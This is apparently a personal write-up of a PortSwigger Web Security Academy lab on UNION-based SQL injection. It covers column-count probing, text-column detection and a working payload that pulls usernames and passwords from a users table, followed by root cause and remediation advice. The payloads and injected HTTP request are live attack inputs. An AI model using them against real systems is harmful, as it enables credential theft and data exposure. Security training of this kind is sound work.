# SQL Injection UNION Attack, Retrieving Data from Other Tables

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
SQL Injection (SQLi) – UNION-Based SQL Injection

## Lab Objective
Exploit a SQL injection vulnerability in the product category filter to retrieve sensitive information from another database table.

The objective is to use a UNION-based SQL injection attack to retrieve the usernames and passwords stored in the `users` table and identify the administrator's credentials.

## Vulnerability Overview
SQL Injection occurs when an application incorporates untrusted user input into SQL queries without properly separating SQL instructions from user-supplied data.

In this lab, the product category filter is vulnerable to SQL injection. The application returns the results of the underlying SQL query in its HTTP response, allowing an attacker to manipulate the query using the UNION operator.

A UNION attack allows an attacker to combine the results of the original SQL query with the results of another SELECT statement.

To successfully perform this attack, the following conditions must be satisfied:

1. Both SELECT statements must return the same number of columns.
2. Corresponding columns must have compatible data types.
3. The injected query must use the correct database table and column names.

By combining the techniques from previous labs, an attacker can identify the query structure, locate a text-compatible column, and retrieve information from other database tables.

In this scenario, the attacker targets the `users` table, which contains usernames and passwords.

## Methodology
1. Reconnaissance of the application and product category filtering functionality.
2. Identifying the vulnerable category parameter.
3. Intercepting HTTP requests using Burp Suite Proxy.
4. Sending the request to Burp Suite Repeater.
5. Determining the number of columns returned by the original SQL query.
6. Identifying a column that accepts text data.
7. Constructing a UNION SELECT statement targeting the `users` table.
8. Retrieving usernames and passwords from the database.
9. Identifying the administrator's credentials.

## Exploitation Steps

1. Open the lab and navigate to the product listing page.

2. Select any product category and observe how the application filters products.

3. Open Burp Suite and navigate to **Proxy → HTTP history**.

4. Locate the GET request responsible for filtering products. Identify the `category` parameter.

5. Send the request to Burp Suite Repeater.

6. Determine the number of columns returned by the original SQL query using the ORDER BY or UNION SELECT NULL technique.

7. Identify which column accepts text values by injecting a recognizable string into individual column positions.

8. Once the column count and text-compatible column are identified, construct a UNION SELECT statement to retrieve information from the `users` table.

9. Use the following payload (assuming three columns and compatible text columns):

   `' UNION SELECT username, password, NULL FROM users--`

10. Send the modified request using Burp Suite Repeater.

11. Inspect the HTTP response. The application should display the usernames and corresponding passwords retrieved from the `users` table.

12. Locate the administrator account in the returned results.

13. Note the administrator's credentials and use them to log in if required by the lab.

14. Return to the lab and verify that it is marked as solved.

## Payloads

**Original category request (illustrative):**

```http
GET /filter?category=Gifts HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
```

**Determining the number of columns:**

```sql
' UNION SELECT NULL,NULL,NULL--
```

**Identifying text-compatible columns:**

```sql
' UNION SELECT 'test',NULL,NULL--
```

**Retrieving usernames and passwords:**

```sql
' UNION SELECT username,password,NULL FROM users--
```

**Example HTTP request:**

```http
GET /filter?category=Gifts'+UNION+SELECT+username,password,NULL+FROM+users-- HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
```

**Note:** The example assumes three columns and that the first two columns accept text values. Adjust the payload according to the column count and data types identified during the previous steps.

## Screenshots

<!-- Paste or drag-and-drop screenshots directly into the editor -->

![Exploit Verification](screenshots/exploit-evidence.png)

## Root Cause

The vulnerability exists because the application directly incorporates user-controlled input into dynamically constructed SQL queries.

The lack of parameterized queries allows attackers to modify the original SQL statement and append additional SELECT operations using the UNION operator.

Since the application returns database query results in its HTTP response, attackers can retrieve information from tables that were not intended to be accessible through the product filtering functionality.

This can expose sensitive information, including usernames, passwords, and other confidential database records.

## Remediation

- Use parameterized queries and prepared statements.
- Never concatenate untrusted user input directly into SQL queries.
- Implement strict input validation for category parameters.
- Apply least-privilege permissions to database accounts.
- Restrict database access to only the tables and operations required by the application.
- Avoid exposing sensitive database information in HTTP responses.
- Store passwords using secure, salted password hashing algorithms such as Argon2id or bcrypt.
- Implement proper exception handling and server-side logging.

## References

- [PortSwigger Web Security Academy – SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger – SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [PortSwigger – Retrieving Data from Other Tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)